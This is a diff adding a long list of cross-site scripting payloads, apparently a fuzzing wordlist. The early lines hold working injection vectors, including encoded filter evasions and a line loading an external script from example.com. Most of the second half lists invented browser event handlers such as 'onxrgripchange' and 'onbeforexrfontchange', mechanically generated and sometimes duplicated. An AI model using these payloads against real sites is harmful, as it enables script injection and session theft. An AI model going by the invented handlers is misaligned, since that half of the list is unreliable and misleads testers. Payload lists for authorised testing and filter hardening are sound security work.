@@ -1,0 +1,1117 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>document.write('XSS')</script>
+<script>document.cookie</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><body onload=alert(1)>
+"><svg onload=alert(1)>
+"><marquee onstart=alert(1)>
+"><div style="width:1000px;height:1000px" onmouseover=alert(1)>
+"><a href="javascript:alert(1)">click</a>
+"><iframe src="javascript:alert(1)">
+"><input autofocus onfocus=alert(1)>
+"><select autofocus onfocus=alert(1)>
+"><textarea autofocus onfocus=alert(1)>
+"><keygen autofocus onfocus=alert(1)>
+"><video><source onerror=alert(1)>
+"><audio src=x onerror=alert(1)>
+"><body onpageshow=alert(1)>
+"><body onhashchange=alert(1)>
+"><details open ontoggle=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src="x" onerror=alert(1)>
+<img src='x' onerror=alert(1)>
+<img src=x onerror=alert(1) //
+<img src=x onerror=alert(1) <!--
+<img src=x onerror=alert(1); //
+<img src=x onerror=alert(1);alert(2)
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"></use></svg>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1) autofocus>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<marquee onstart=alert(1)>
+<marquee onfinish=alert(1)>
+<marquee behavior=alternate onstart=alert(1)>
+<div style="width:1000px;height:1000px" onmouseover=alert(1)>
+<div style="width:1000px;height:1000px" onmouseenter=alert(1)>
+<div style="width:1000px;height:1000px" onmouseleave=alert(1)>
+<div draggable="true" ondragstart=alert(1)>drag me</div>
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert(1)></details>
+<dialog open onclose=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<video><source onerror=alert(1)>
+<video poster=javascript:alert(1)//></video>
+<audio src=x onerror=alert(1)>
+<audio controls onloadedmetadata=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<applet code="javascript:alert(1)">
+<math><mi>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;</mi></math>
+<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>
+<isindex type=image src=1 onerror=alert(1)>
+<isindex action=javascript:alert(1) type=image>
+<form><button formaction=javascript:alert(1)>X</button>
+<form><input formaction=javascript:alert(1) type=submit value=X>
+<form><input formaction=javascript:alert(1) type=image src=x>
+<base href="javascript:alert(1)//">
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:alert(1)">click</a> //test
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<frame src="javascript:alert(1)">
+<frameset onload=alert(1)>
+<bgsound src="javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background:url(javascript:alert(1))}</style>
+<xss style="behavior:url(javascript:alert(1))">
+<xml id="xss" src="javascript:alert(1)"></xml>
+<?xml-stylesheet href="javascript:alert(1)"?>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="set-cookie" content="cookie=javascript:alert(1)">
+<script>alert(1)</script //comment
+<script>alert(1)//comment
+<script>/*comment*/alert(1)</script>
+<script>alert(1);<!--
+<script>alert(1);//-->
+<script>-->alert(1)</script>
+<script>+alert(1)</script>
+<script>alert`1`</script>
+<script>alert(1)</script	>
+<script>alert(1)</script
+>
+<script>alert(1)</script<x>
+<script>alert(1)</script a="
+<script>alert(1)</script/ 
+<script>alert(1)</script 
+<script>alert(1)</script%20
+<script>alert(1) %0d%0a
+<script>eval('al'+'ert(1)')</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>Function('alert(1)')()</script>
+<script>window['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>'alert(1)'.replace(/.+/,eval)</script>
+<script>document.body.innerHTML='<svg onload=alert(1)>'</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>location.assign('javascript:alert(1)')</script>
+<script>location.replace('javascript:alert(1)')</script>
+<script>open('javascript:alert(1)')</script>
+<script>window.open('javascript:alert(1)')</script>
+<script>document.URL='javascript:alert(1)'</script>
+<script>document.documentURI='javascript:alert(1)'</script>
+<script>document.baseURI='javascript:alert(1)'</script>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
+<script src="//example.com/xss.js"></script>
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror=alert(1) onload=alert(2)>
+<img src=x onerror=alert(1) onmouseover=alert(2)>
+<img src=x onerror=alert(1) style=width:100%;height:100% onmouseover=alert(2)>
+<img src=x onerror=alert(1) id=x tabindex=1 onfocus=alert(2) autofocus>
+<svg onload=javascript:alert(1)>
+<svg onload=alert(1) onmouseover=alert(2)>
+<body onload=alert(1) onpageshow=alert(2)>
+<body onload=alert(1) onhashchange=alert(2)>
+<div onclick="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%"></div>
+<div onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%"></div>
+<x onclick="alert(1)">click</x>
+<x onmouseover="alert(1)">hover</x>
+<x onmouseup="alert(1)">release</x>
+<x onmousedown="alert(1)">press</x>
+<x oncontextmenu="alert(1)">right click</x>
+<x ondblclick="alert(1)">double click</x>
+<x onfocus="alert(1)" tabindex=1 autofocus>
+<x onblur="alert(1)" tabindex=1 autofocus><input autofocus>
+<x onfocusin="alert(1)" tabindex=1 autofocus>
+<x onfocusout="alert(1)" tabindex=1 autofocus><input autofocus>
+<x onkeydown="alert(1)" tabindex=1 autofocus>
+<x onkeypress="alert(1)" tabindex=1 autofocus>
+<x onkeyup="alert(1)" tabindex=1 autofocus>
+<x oncopy="alert(1)" tabindex=1 autofocus>
+<x oncut="alert(1)" tabindex=1 autofocus>
+<x onpaste="alert(1)" tabindex=1 autofocus>
+<x ondrag="alert(1)" draggable="true">drag</x>
+<x ondragend="alert(1)" draggable="true">drag end</x>
+<x ondragenter="alert(1)" draggable="true">drag enter</x>
+<x ondragleave="alert(1)" draggable="true">drag leave</x>
+<x ondragover="alert(1)" draggable="true">drag over</x>
+<x ondragstart="alert(1)" draggable="true">drag start</x>
+<x ondrop="alert(1)" draggable="true">drop</x>
+<x onscroll="alert(1)">scroll<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus></x>
+<x onwheel="alert(1)">wheel</x>
+<x oncanplay="alert(1)"><video src=x></video></x>
+<x oncanplaythrough="alert(1)"><video src=x></video></x>
+<x ondurationchange="alert(1)"><video src=x></video></x>
+<x onemptied="alert(1)"><video src=x></video></x>
+<x onended="alert(1)"><video src=x></video></x>
+<x onerror="alert(1)"><video src=x></video></x>
+<x onloadeddata="alert(1)"><video src=x></video></x>
+<x onloadedmetadata="alert(1)"><video src=x></video></x>
+<x onloadstart="alert(1)"><video src=x></video></x>
+<x onpause="alert(1)"><video src=x></video></x>
+<x onplay="alert(1)"><video src=x></video></x>
+<x onplaying="alert(1)"><video src=x></video></x>
+<x onprogress="alert(1)"><video src=x></video></x>
+<x onratechange="alert(1)"><video src=x></video></x>
+<x onseeked="alert(1)"><video src=x></video></x>
+<x onseeking="alert(1)"><video src=x></video></x>
+<x onstalled="alert(1)"><video src=x></video></x>
+<x onsuspend="alert(1)"><video src=x></video></x>
+<x ontimeupdate="alert(1)"><video src=x></video></x>
+<x onvolumechange="alert(1)"><video src=x></video></x>
+<x onwaiting="alert(1)"><video src=x></video></x>
+<x onanimationend="alert(1)"><style>@keyframes x{}</style><div style=animation:x></div></x>
+<x onanimationiteration="alert(1)"><style>@keyframes x{}</style><div style=animation:x></div></x>
+<x onanimationstart="alert(1)"><style>@keyframes x{}</style><div style=animation:x></div></x>
+<x ontransitionend="alert(1)"><style>div{transition:all 1s}</style><div></div></x>
+<x onabort="alert(1)"><img src=x></x>
+<x onafterprint="alert(1)">
+<x onbeforeprint="alert(1)">
+<x onbeforeunload="alert(1)">
+<x onhashchange="alert(1)">
+<x onlanguagechange="alert(1)">
+<x onmessage="alert(1)">
+<x onoffline="alert(1)">
+<x ononline="alert(1)">
+<x onpagehide="alert(1)">
+<x onpageshow="alert(1)">
+<x onpopstate="alert(1)">
+<x onrejectionhandled="alert(1)">
+<x onstorage="alert(1)">
+<x onunhandledrejection="alert(1)">
+<x onunload="alert(1)">
+<x onpointerdown="alert(1)" style="touch-action:none">
+<x onpointermove="alert(1)" style="touch-action:none">
+<x onpointerup="alert(1)" style="touch-action:none">
+<x onpointercancel="alert(1)" style="touch-action:none">
+<x onpointerover="alert(1)" style="touch-action:none">
+<x onpointerout="alert(1)" style="touch-action:none">
+<x onpointerenter="alert(1)" style="touch-action:none">
+<x onpointerleave="alert(1)" style="touch-action:none">
+<x ongotpointercapture="alert(1)" style="touch-action:none">
+<x onlostpointercapture="alert(1)" style="touch-action:none">
+<x ontouchstart="alert(1)">
+<x ontouchend="alert(1)">
+<x ontouchmove="alert(1)">
+<x ontouchcancel="alert(1)">
+<x onformdata="alert(1)">
+<x onforminput="alert(1)">
+<x oninput="alert(1)">
+<x oninvalid="alert(1)">
+<x onreset="alert(1)">
+<x onsearch="alert(1)">
+<x onselect="alert(1)">
+<x onsubmit="alert(1)">
+<x oncancel="alert(1)">
+<x onclose="alert(1)">
+<x ontoggle="alert(1)">
+<x onauxclick="alert(1)">
+<x oncontextlost="alert(1)">
+<x oncontextrestored="alert(1)">
+<x onslotchange="alert(1)">
+<x onbeforeinput="alert(1)">
+<x oncontentvisibilityautostatechange="alert(1)">
+<x onbeforematch="alert(1)">
+<x onbeforetoggle="alert(1)">
+<x onrenderblockedstatus="alert(1)">
+<x onrenderstatus="alert(1)">
+<x onbeforexrselect="alert(1)">
+<x onxrselectstart="alert(1)">
+<x onxrselectend="alert(1)">
+<x onxrselect="alert(1)">
+<x onbeforexrhand="alert(1)">
+<x onbeforexrhandstart="alert(1)">
+<x onbeforexrhandend="alert(1)">
+<x onxrhand="alert(1)">
+<x onbeforexrinputsourcechange="alert(1)">
+<x onxrinputsourcechange="alert(1)">
+<x onbeforexrinputsourceschange="alert(1)">
+<x onxrinputsourceschange="alert(1)">
+<x onbeforexrtargetraymodechange="alert(1)">
+<x onxrtargetraymodechange="alert(1)">
+<x onbeforexrtargetraymodeschange="alert(1)">
+<x onxrtargetraymodeschange="alert(1)">
+<x onbeforexrsessionmodechange="alert(1)">
+<x onxrsessionmodechange="alert(1)">
+<x onbeforexrsessionmodeschange="alert(1)">
+<x onxrsessionmodeschange="alert(1)">
+<x onbeforexrvisibilitychange="alert(1)">
+<x onxrvisibilitychange="alert(1)">
+<x onbeforexrvisibilitieschange="alert(1)">
+<x onxrvisibilitieschange="alert(1)">
+<x onbeforexrposechange="alert(1)">
+<x onxrposechange="alert(1)">
+<x onbeforexrposeschange="alert(1)">
+<x onxrposeschange="alert(1)">
+<x onbeforexrinputposechange="alert(1)">
+<x onxrinputposechange="alert(1)">
+<x onbeforexrinputposeschange="alert(1)">
+<x onxrinputposeschange="alert(1)">
+<x onbeforexrgripchange="alert(1)">
+<x onxrgripchange="alert(1)">
+<x onbeforexrgripschange="alert(1)">
+<x onxrgripschange="alert(1)">
+<x onbeforexrsqueezechange="alert(1)">
+<x onxrsqueezechange="alert(1)">
+<x onbeforexrsqueezeschange="alert(1)">
+<x onxrsqueezeschange="alert(1)">
+<x onbeforexrthumbstickchange="alert(1)">
+<x onxrthumbstickchange="alert(1)">
+<x onbeforexrthumbstickschange="alert(1)">
+<x onxrthumbstickschange="alert(1)">
+<x onbeforexrtouchpadchange="alert(1)">
+<x onxrtouchpadchange="alert(1)">
+<x onbeforexrtouchpadschange="alert(1)">
+<x onxrtouchpadschange="alert(1)">
+<x onbeforexrbuttonchange="alert(1)">
+<x onxrbuttonchange="alert(1)">
+<x onbeforexrbuttonschange="alert(1)">
+<x onxrbuttonschange="alert(1)">
+<x onbeforexrtriggerchange="alert(1)">
+<x onxrtriggerchange="alert(1)">
+<x onbeforexrtriggerschange="alert(1)">
+<x onxrtriggerschange="alert(1)">
+<x onbeforexrbumperchange="alert(1)">
+<x onxrbumperchange="alert(1)">
+<x onbeforexrbumperschange="alert(1)">
+<x onxrbumperschange="alert(1)">
+<x onbeforexrmenuchange="alert(1)">
+<x onxrmenuchange="alert(1)">
+<x onbeforexrmenuschange="alert(1)">
+<x onxrmenuschange="alert(1)">
+<x onbeforexrsystemchange="alert(1)">
+<x onxrsystemchange="alert(1)">
+<x onbeforexrsystemschange="alert(1)">
+<x onxrsystemschange="alert(1)">
+<x onbeforexrtrackpadchange="alert(1)">
+<x onxrtrackpadchange="alert(1)">
+<x onbeforexrtrackpadschange="alert(1)">
+<x onxrtrackpadschange="alert(1)">
+<x onbeforexrjoystickchange="alert(1)">
+<x onxrjoystickchange="alert(1)">
+<x onbeforexrjoystickschange="alert(1)">
+<x onxrjoystickschange="alert(1)">
+<x onbeforexrdpadchange="alert(1)">
+<x onxrdpadchange="alert(1)">
+<x onbeforexrdpadschange="alert(1)">
+<x onxrdpadschange="alert(1)">
+<x onbeforexrhapticchange="alert(1)">
+<x onxrhapticchange="alert(1)">
+<x onbeforexrhapticschange="alert(1)">
+<x onxrhapticschange="alert(1)">
+<x onbeforexreyechange="alert(1)">
+<x onxreyechange="alert(1)">
+<x onbeforexreyeschange="alert(1)">
+<x onxreyeschange="alert(1)">
+<x onbeforexrhandmeshchange="alert(1)">
+<x onxrhandmeshchange="alert(1)">
+<x onbeforexrhandmesheschange="alert(1)">
+<x onxrhandmesheschange="alert(1)">
+<x onbeforexrcontrollerchange="alert(1)">
+<x onxrcontrollerchange="alert(1)">
+<x onbeforexrcontrollerschange="alert(1)">
+<x onxrcontrollerschange="alert(1)">
+<x onbeforexrlightchange="alert(1)">
+<x onxrlightchange="alert(1)">
+<x onbeforexrlightschange="alert(1)">
+<x onxrlightschange="alert(1)">
+<x onbeforexrcamerachange="alert(1)">
+<x onxrcamerachange="alert(1)">
+<x onbeforexrcameraschange="alert(1)">
+<x onxrcameraschange="alert(1)">
+<x onbeforexrplanechange="alert(1)">
+<x onxrplanechange="alert(1)">
+<x onbeforexrplaneschange="alert(1)">
+<x onxrplaneschange="alert(1)">
+<x onbeforexrpointcloudchange="alert(1)">
+<x onxrpointcloudchange="alert(1)">
+<x onbeforexrpointcloudschange="alert(1)">
+<x onxrpointcloudschange="alert(1)">
+<x onbeforexrmeshchange="alert(1)">
+<x onxrmeshchange="alert(1)">
+<x onbeforexrmesheschange="alert(1)">
+<x onxrmesheschange="alert(1)">
+<x onbeforexrmaterialchange="alert(1)">
+<x onxrmaterialchange="alert(1)">
+<x onbeforexrmaterialschange="alert(1)">
+<x onxrmaterialschange="alert(1)">
+<x onbeforexrimagechange="alert(1)">
+<x onxrimagechange="alert(1)">
+<x onbeforexrimageschange="alert(1)">
+<x onxrimageschange="alert(1)">
+<x onbeforexrtextchange="alert(1)">
+<x onxrtextchange="alert(1)">
+<x onbeforexrtextschange="alert(1)">
+<x onxrtextschange="alert(1)">
+<x onbeforexrfontchange="alert(1)">
+<x onxrfontchange="alert(1)">
+<x onbeforexrfontschange="alert(1)">
+<x onxrfontschange="alert(1)">
+<x onbeforexrlayoutchange="alert(1)">
+<x onxrlayoutchange="alert(1)">
+<x onbeforexrlayoutschange="alert(1)">
+<x onxrlayoutschange="alert(1)">
+<x onbeforexrscenechange="alert(1)">
+<x onxrscenechange="alert(1)">
+<x onbeforexrsceneschange="alert(1)">
+<x onxrsceneschange="alert(1)">
+<x onbeforexrworldchange="alert(1)">
+<x onxrworldchange="alert(1)">
+<x onbeforexrworldschange="alert(1)">
+<x onxrworldschange="alert(1)">
+<x onbeforexrspacechange="alert(1)">
+<x onxrspacechange="alert(1)">
+<x onbeforexrspaceschange="alert(1)">
+<x onxrspaceschange="alert(1)">
+<x onbeforexrreferencechange="alert(1)">
+<x onxrreferencechange="alert(1)">
+<x onbeforexrreferenceschange="alert(1)">
+<x onxrreferenceschange="alert(1)">
+<x onbeforexrstagechange="alert(1)">
+<x onxrstagechange="alert(1)">
+<x onbeforexrstageschange="alert(1)">
+<x onxrstageschange="alert(1)">
+<x onbeforexrframechange="alert(1)">
+<x onxrframechange="alert(1)">
+<x onbeforexrframeschange="alert(1)">
+<x onxrframeschange="alert(1)">
+<x onbeforexranimationchange="alert(1)">
+<x onxranimationchange="alert(1)">
+<x onbeforexranimationschange="alert(1)">
+<x onxranimationschange="alert(1)">
+<x onbeforexrtransitionchange="alert(1)">
+<x onxrtransitionchange="alert(1)">
+<x onbeforexrtransitionschange="alert(1)">
+<x onxrtransitionschange="alert(1)">
+<x onbeforexreffectchange="alert(1)">
+<x onxreffectchange="alert(1)">
+<x onbeforexreffectschange="alert(1)">
+<x onxreffectschange="alert(1)">
+<x onbeforexrfilterchange="alert(1)">
+<x onxrfilterchange="alert(1)">
+<x onbeforexrfilterschange="alert(1)">
+<x onxrfilterschange="alert(1)">
+<x onbeforexrshadowchange="alert(1)">
+<x onxrshadowchange="alert(1)">
+<x onbeforexrshadowschange="alert(1)">
+<x onxrshadowschange="alert(1)">
+<x onbeforexrreflectionchange="alert(1)">
+<x onxrreflectionchange="alert(1)">
+<x onbeforexrreflectionschange="alert(1)">
+<x onxrreflectionschange="alert(1)">
+<x onbeforexrposterchange="alert(1)">
+<x onxrposterchange="alert(1)">
+<x onbeforexrposterschange="alert(1)">
+<x onxrposterschange="alert(1)">
+<x onbeforexrmaskchange="alert(1)">
+<x onxrmaskchange="alert(1)">
+<x onbeforexrmaskschange="alert(1)">
+<x onxrmaskschange="alert(1)">
+<x onbeforexrclipchange="alert(1)">
+<x onxrclipchange="alert(1)">
+<x onbeforexrclipschange="alert(1)">
+<x onxrclipschange="alert(1)">
+<x onbeforexrpatternchange="alert(1)">
+<x onxrpatternchange="alert(1)">
+<x onbeforexrpatternschange="alert(1)">
+<x onxrpatternschange="alert(1)">
+<x onbeforexrgradientchange="alert(1)">
+<x onxrgradientchange="alert(1)">
+<x onbeforexrgradientschange="alert(1)">
+<x onxrgradientschange="alert(1)">
+<x onbeforexrtransformchange="alert(1)">
+<x onxrtransformchange="alert(1)">
+<x onbeforexrtransformschange="alert(1)">
+<x onxrtransformschange="alert(1)">
+<x onbeforexrcompositechange="alert(1)">
+<x onxrcompositechange="alert(1)">
+<x onbeforexrcompositeschange="alert(1)">
+<x onxrcompositeschange="alert(1)">
+<x onbeforexrblendchange="alert(1)">
+<x onxrblendchange="alert(1)">
+<x onbeforexrblendschange="alert(1)">
+<x onxrblendschange="alert(1)">
+<x onbeforexrisolationchange="alert(1)">
+<x onxrisolationchange="alert(1)">
+<x onbeforexrisolationschange="alert(1)">
+<x onxrisolationschange="alert(1)">
+<x onbeforexrmixchange="alert(1)">
+<x onxrmixchange="alert(1)">
+<x onbeforexrmixschange="alert(1)">
+<x onxrmixschange="alert(1)">
+<x onbeforexroverflowchange="alert(1)">
+<x onxroverflowchange="alert(1)">
+<x onbeforexroverflowschange="alert(1)">
+<x onxroverflowschange="alert(1)">
+<x onbeforexrvisibilitychange="alert(1)">
+<x onxrvisibilitychange="alert(1)">
+<x onbeforexrvisibilitieschange="alert(1)">
+<x onxrvisibilitieschange="alert(1)">
+<x onbeforexropacitychange="alert(1)">
+<x onxropacitychange="alert(1)">
+<x onbeforexropacityschange="alert(1)">
+<x onxropacityschange="alert(1)">
+<x onbeforexrcolorchange="alert(1)">
+<x onxrcolorchange="alert(1)">
+<x onbeforexrcolorschange="alert(1)">
+<x onxrcolorschange="alert(1)">
+<x onbeforexrbackgroundchange="alert(1)">
+<x onxrbackgroundchange="alert(1)">
+<x onbeforexrbackgroundschange="alert(1)">
+<x onxrbackgroundschange="alert(1)">
+<x onbeforexrborderchange="alert(1)">
+<x onxrborderchange="alert(1)">
+<x onbeforexrborderschange="alert(1)">
+<x onxrborderschange="alert(1)">
+<x onbeforexroutlinechange="alert(1)">
+<x onxroutlinechange="alert(1)">
+<x onbeforexroutlineschange="alert(1)">
+<x onxroutlineschange="alert(1)">
+<x onbeforexrboxshadowchange="alert(1)">
+<x onxrboxshadowchange="alert(1)">
+<x onbeforexrboxshadowschange="alert(1)">
+<x onxrboxshadowschange="alert(1)">
+<x onbeforexrtextshadowchange="alert(1)">
+<x onxrtextshadowchange="alert(1)">
+<x onbeforexrtextshadowschange="alert(1)">
+<x onxrtextshadowschange="alert(1)">
+<x onbeforexrzindexchange="alert(1)">
+<x onxrzindexchange="alert(1)">
+<x onbeforexrzindexschange="alert(1)">
+<x onxrzindexschange="alert(1)">
+<x onbeforexrorderchange="alert(1)">
+<x onxrorderchange="alert(1)">
+<x onbeforexrorderschange="alert(1)">
+<x onxrorderschange="alert(1)">
+<x onbeforexrlayoutchange="alert(1)">
+<x onxrlayoutchange="alert(1)">
+<x onbeforexrlayoutschange="alert(1)">
+<x onxrlayoutschange="alert(1)">
+<x onbeforexrgridchange="alert(1)">
+<x onxrgridchange="alert(1)">
+<x onbeforexrgridschange="alert(1)">
+<x onxrgridschange="alert(1)">
+<x onbeforexrflexchange="alert(1)">
+<x onxrflexchange="alert(1)">
+<x onbeforexrflexschange="alert(1)">
+<x onxrflexschange="alert(1)">
+<x onbeforexralignchange="alert(1)">
+<x onxralignchange="alert(1)">
+<x onbeforexralignschange="alert(1)">
+<x onxralignschange="alert(1)">
+<x onbeforexrjustifychange="alert(1)">
+<x onxrjustifychange="alert(1)">
+<x onbeforexrjustifyschange="alert(1)">
+<x onxrjustifyschange="alert(1)">
+<x onbeforexrselfchange="alert(1)">
+<x onxrselfchange="alert(1)">
+<x onbeforexrselfschange="alert(1)">
+<x onxrselfschange="alert(1)">
+<x onbeforexrcontentchange="alert(1)">
+<x onxrcontentchange="alert(1)">
+<x onbeforexrcontentschange="alert(1)">
+<x onxrcontentschange="alert(1)">
+<x onbeforexritemschange="alert(1)">
+<x onxritemschange="alert(1)">
+<x onbeforexritemsschange="alert(1)">
+<x onxritemsschange="alert(1)">
+<x onbeforexrgapchange="alert(1)">
+<x onxrgapchange="alert(1)">
+<x onbeforexrgapschange="alert(1)">
+<x onxrgapschange="alert(1)">
+<x onbeforexrwrapchange="alert(1)">
+<x onxrwrapchange="alert(1)">
+<x onbeforexrwrapschange="alert(1)">
+<x onxrwrapschange="alert(1)">
+<x onbeforexrflowchange="alert(1)">
+<x onxrflowchange="alert(1)">
+<x onbeforexrflowschange="alert(1)">
+<x onxrflowschange="alert(1)">
+<x onbeforexrdisplaychange="alert(1)">
+<x onxrdisplaychange="alert(1)">
+<x onbeforexrdisplayschange="alert(1)">
+<x onxrdisplayschange="alert(1)">
+<x onbeforexrpositionchange="alert(1)">
+<x onxrpositionchange="alert(1)">
+<x onbeforexrpositionschange="alert(1)">
+<x onxrpositionschange="alert(1)">
+<x onbeforexrtopchange="alert(1)">
+<x onxrtopchange="alert(1)">
+<x onbeforexrtopschange="alert(1)">
+<x onxrtopschange="alert(1)">
+<x onbeforexrrightchange="alert(1)">
+<x onxrrightchange="alert(1)">
+<x onbeforexrrightschange="alert(1)">
+<x onxrrightschange="alert(1)">
+<x onbeforexrbottomchange="alert(1)">
+<x onxrbottomchange="alert(1)">
+<x onbeforexrbottomschange="alert(1)">
+<x onxrbottomschange="alert(1)">
+<x onbeforexrleftchange="alert(1)">
+<x onxrleftchange="alert(1)">
+<x onbeforexrleftschange="alert(1)">
+<x onxrleftschange="alert(1)">
+<x onbeforexrzindexchange="alert(1)">
+<x onxrzindexchange="alert(1)">
+<x onbeforexrzindexschange="alert(1)">
+<x onxrzindexschange="alert(1)">
+<x onbeforexrmarginchange="alert(1)">
+<x onxrmarginchange="alert(1)">
+<x onbeforexrmarginschange="alert(1)">
+<x onxrmarginschange="alert(1)">
+<x onbeforexrpaddingchange="alert(1)">
+<x onxrpaddingchange="alert(1)">
+<x onbeforexrpaddingschange="alert(1)">
+<x onxrpaddingschange="alert(1)">
+<x onbeforexrwidthchange="alert(1)">
+<x onxrwidthchange="alert(1)">
+<x onbeforexrwidthschange="alert(1)">
+<x onxrwidthschange="alert(1)">
+<x onbeforexrheightchange="alert(1)">
+<x onxrheightchange="alert(1)">
+<x onbeforexrheightschange="alert(1)">
+<x onxrheightschange="alert(1)">
+<x onbeforexrminwidthchange="alert(1)">
+<x onxrminwidthchange="alert(1)">
+<x onbeforexrminwidthschange="alert(1)">
+<x onxrminwidthschange="alert(1)">
+<x onbeforexrmaxwidthchange="alert(1)">
+<x onxrmaxwidthchange="alert(1)">
+<x onbeforexrmaxwidthschange="alert(1)">
+<x onxrmaxwidthschange="alert(1)">
+<x onbeforexrminheightchange="alert(1)">
+<x onxrminheightchange="alert(1)">
+<x onbeforexrminheightschange="alert(1)">
+<x onxrminheightschange="alert(1)">
+<x onbeforexrmaxheightchange="alert(1)">
+<x onxrmaxheightchange="alert(1)">
+<x onbeforexrmaxheightschange="alert(1)">
+<x onxrmaxheightschange="alert(1)">
+<x onbeforexrboxsizingchange="alert(1)">
+<x onxrboxsizingchange="alert(1)">
+<x onbeforexrboxsizingschange="alert(1)">
+<x onxrboxsizingschange="alert(1)">
+<x onbeforexroverflowxchange="alert(1)">
+<x onxroverflowxchange="alert(1)">
+<x onbeforexroverflowxschange="alert(1)">
+<x onxroverflowxschange="alert(1)">
+<x onbeforexroverflowychange="alert(1)">
+<x onxroverflowychange="alert(1)">
+<x onbeforexroverflowyschange="alert(1)">
+<x onxroverflowyschange="alert(1)">
+<x onbeforexroverflowwrapchange="alert(1)">
+<x onxroverflowwrapchange="alert(1)">
+<x onbeforexroverflowwrapschange="alert(1)">
+<x onxroverflowwrapschange="alert(1)">
+<x onbeforexrwordbreakchange="alert(1)">
+<x onxrwordbreakchange="alert(1)">
+<x onbeforexrwordbreakschange="alert(1)">
+<x onxrwordbreakschange="alert(1)">
+<x onbeforexrwordwrapchange="alert(1)">
+<x onxrwordwrapchange="alert(1)">
+<x onbeforexrwordwrapschange="alert(1)">
+<x onxrwordwrapschange="alert(1)">
+<x onbeforexrwhitechange="alert(1)">
+<x onxrwhitechange="alert(1)">
+<x onbeforexrwhiteschange="alert(1)">
+<x onxrwhiteschange="alert(1)">
+<x onbeforexrtextalignchange="alert(1)">
+<x onxrtextalignchange="alert(1)">
+<x onbeforexrtextalignschange="alert(1)">
+<x onxrtextalignschange="alert(1)">
+<x onbeforexrtextdecorationchange="alert(1)">
+<x onxrtextdecorationchange="alert(1)">
+<x onbeforexrtextdecorationschange="alert(1)">
+<x onxrtextdecorationschange="alert(1)">
+<x onbeforexrtexttransformchange="alert(1)">
+<x onxrtexttransformchange="alert(1)">
+<x onbeforexrtexttransformschange="alert(1)">
+<x onxrtexttransformschange="alert(1)">
+<x onbeforexrtextindentchange="alert(1)">
+<x onxrtextindentchange="alert(1)">
+<x onbeforexrtextindentschange="alert(1)">
+<x onxrtextindentschange="alert(1)">
+<x onbeforexrletterspacingchange="alert(1)">
+<x onxrletterspacingchange="alert(1)">
+<x onbeforexrletterspacingschange="alert(1)">
+<x onxrletterspacingschange="alert(1)">
+<x onbeforexrwordspacingchange="alert(1)">
+<x onxrwordspacingchange="alert(1)">
+<x onbeforexrwordspacingschange="alert(1)">
+<x onxrwordspacingschange="alert(1)">
+<x onbeforexrlineheightchange="alert(1)">
+<x onxrlineheightchange="alert(1)">
+<x onbeforexrlineheightschange="alert(1)">
+<x onxrlineheightschange="alert(1)">
+<x onbeforexrverticalalignchange="alert(1)">
+<x onxrverticalalignchange="alert(1)">
+<x onbeforexrverticalalignschange="alert(1)">
+<x onxrverticalalignschange="alert(1)">
+<x onbeforexrfontsizechange="alert(1)">
+<x onxrfontsizechange="alert(1)">
+<x onbeforexrfontsizeschange="alert(1)">
+<x onxrfontsizeschange="alert(1)">
+<x onbeforexrfontstylechange="alert(1)">
+<x onxrfontstylechange="alert(1)">
+<x onbeforexrfontstyleschange="alert(1)">
+<x onxrfontstyleschange="alert(1)">
+<x onbeforexrfontweightchange="alert(1)">
+<x onxrfontweightchange="alert(1)">
+<x onbeforexrfontweightschange="alert(1)">
+<x onxrfontweightschange="alert(1)">
+<x onbeforexrfontfamilychange="alert(1)">
+<x onxrfontfamilychange="alert(1)">
+<x onbeforexrfontfamilyschange="alert(1)">
+<x onxrfontfamilyschange="alert(1)">
+<x onbeforexrcolorchange="alert(1)">
+<x onxrcolorchange="alert(1)">
+<x onbeforexrcolorschange="alert(1)">
+<x onxrcolorschange="alert(1)">
+<x onbeforexrbackgroundcolorchange="alert(1)">
